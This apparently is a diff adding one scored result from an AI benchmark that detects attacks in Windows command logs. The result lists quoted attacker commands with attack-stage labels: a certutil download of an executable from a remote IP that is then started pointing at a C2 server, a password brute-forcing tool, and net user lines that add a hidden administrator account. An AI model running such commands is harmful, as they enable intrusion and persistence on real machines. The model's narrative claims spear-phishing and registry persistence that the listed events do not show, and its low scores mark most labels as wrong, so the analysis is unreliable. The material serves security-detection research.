@@ -1,0 +1,167 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "cmd.exe /c \"taskkill /f /im agent.exe & certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe & cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd.exe /c echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo start:dbb2f234-101f-4f44-bb97-72263635f506\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo start:b7f92752-df34-4b08-9e98-45a3004b94ff\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo start:e96998eb-ab9a-4a48-979c-fb68511a6a83\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo start:e3c59524-1c33-40e6-99c4-a2d8329d047f\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo start:60039041-7450-46ab-99f6-126b30b91407\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c echo start:78cfa46d-d648-44ac-9ed8-ee7469cb82c2",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c echo start:5a860809-a5ba-4924-8c54-065a8650bdc9",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c echo start:e3c59524-1c33-40e6-99c4-a2d8329d047f",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c echo start:60039041-7450-46ab-99f6-126b30b91407",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c echo start:5a860809-a5ba-4924-8c54-065a8650bdc9",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c echo start:b7f92752-df34-4b08-9e98-45a3004b94ff",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c echo start:dbb2f234-101f-4f44-bb97-72263635f506",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c echo start:e3c59524-1c33-40e6-99c4-a2d8329d047f",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c echo start:e96998eb-ab9a-4a48-979c-fb68511a6a83",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c echo start:60039041-7450-46ab-99f6-126b30b91407",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c echo start:5a860809-a5ba-4924-8c54-065a8650bdc9",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "winbrute.exe administrator_pass.txt administrator",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd.exe /c echo [S]",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /c echo [E]",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /c echo start:78cfa46d-d648-44ac-9ed8-ee7469cb82c2",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c cd /d D:/phpStudy/WWW & net user nbb nb123. /add & net localgroup administrators nbb /add & echo [S]",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "cmd.exe /c cd /d D:/phpStudy/WWW & net user oop o33 /add & echo [S]",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "cmd.exe /c cd /d D:/phpStudy/WWW & wmic cpu get NumberOfLogicalProcessors & echo [S]",
+        "stage": "Discovery"
+      },
+      {
+        "command": "target machine's ip addresses scan result via nbtscan.exe & cmd.exe /c del /f /q nbtscan.exe",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "cmd.exe /c cd /d D:/phpStudy/WWW & tasklist /svc | findstr TermService & echo [S]",
+        "stage": "Discovery"
+      }
+    ],
+    "narrative": "The attack initiated with an initial access vector possibly through spear-phishing emails containing links or attachments leading to malicious executables. Post-access, the adversaries deployed persistence mechanisms such as scheduled tasks and registry keys. They then gained administrative privileges to fully compromise the system. Throughout the campaign, they collected information about the system\u2019s configuration and ran scans to identify potential targets within the network. Additionally, the attackers used commands and services to move laterally between systems.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 26923,
+      "completion_tokens": 4548,
+      "total_tokens": 31471,
+      "wall_clock_s": 51.682,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.06896551724137931,
+      "recall": 0.3333333333333333,
+      "f1": 0.1142857142857143,
+      "tp": 2,
+      "fp": 27,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.034482758620689655,
+      "recall": 0.16666666666666666,
+      "f1": 0.05714285714285715,
+      "tp": 1,
+      "fp": 28,
+      "fn": 5,
+      "recall_partial": 0.25
+    },
+    "hallucination_rate": 0.125,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 26923,
+      "completion_tokens": 4548,
+      "total_tokens": 31471,
+      "wall_clock_s": 51.682,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
